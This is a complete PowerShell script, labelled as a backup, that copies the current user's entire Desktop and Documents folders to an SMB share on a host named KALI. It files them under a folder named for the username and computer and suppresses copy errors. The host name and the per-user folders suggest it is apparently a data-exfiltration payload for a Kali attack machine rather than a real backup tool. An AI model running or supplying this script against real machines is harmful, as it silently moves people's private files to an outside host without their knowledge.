# Define the SMB share path (change this to your SMB share location)
$smbSharePath = "\\KALI\Backup"

# Get the current username and computer name
$username = $env:USERNAME
$computerName = $env:COMPUTERNAME

# Create a folder on the SMB share named "username_pcname"
$targetFolder = Join-Path $smbSharePath "$username`_$computerName"

# Check if the SMB share is reachable
if (!(Test-Path -Path $smbSharePath)) {
    Write-Host "SMB share not accessible. Check the network path."
    exit
}

# Create the folder if it doesn't exist
if (!(Test-Path -Path $targetFolder)) {
    New-Item -Path $targetFolder -ItemType Directory
}

# Define source directories
$desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
$documentsPath = [System.IO.Path]::Combine($env:USERPROFILE, "Documents")

# Copy files from Desktop to the SMB share
if (Test-Path -Path $desktopPath) {
    Write-Host "Copying Desktop files..."
    Copy-Item -Path "$desktopPath\*" -Destination $targetFolder -Recurse -Force -ErrorAction SilentlyContinue
}

# Copy files from Documents to the SMB share
if (Test-Path -Path $documentsPath) {
    Write-Host "Copying Documents files..."
    Copy-Item -Path "$documentsPath\*" -Destination $targetFolder -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "Backup completed successfully to $targetFolder"
